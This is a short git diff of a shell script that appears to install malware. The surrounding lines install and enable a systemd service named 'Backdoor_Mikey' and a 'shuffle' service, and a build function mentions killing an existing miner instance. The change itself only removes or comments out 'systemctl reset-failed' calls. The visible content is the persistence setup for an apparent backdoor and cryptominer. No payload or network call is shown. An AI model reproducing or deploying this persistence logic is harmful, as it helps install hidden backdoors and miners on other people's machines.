@@ -192,8 +192,7 @@ EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
     log "..... Mikey daemon is here ....."
     sudo systemctl enable Backdoor_Mikey.service
-    sudo systemctl start Backdoor_Mikey.service  
-    sudo systemctl reset-failed
+    sudo systemctl start Backdoor_Mikey.service
 }
 function shuffler () {
     # SHUFFLE
@@ -213,7 +212,7 @@ EOL
     log "shuffle service initiated ."
     sudo systemctl enable shuffle.service
     sudo systemctl start shuffle.service
-    sudo systemctl reset-failed
+    #sudo systemctl reset-failed
 }
 function build () {
     # kill existing miner instance
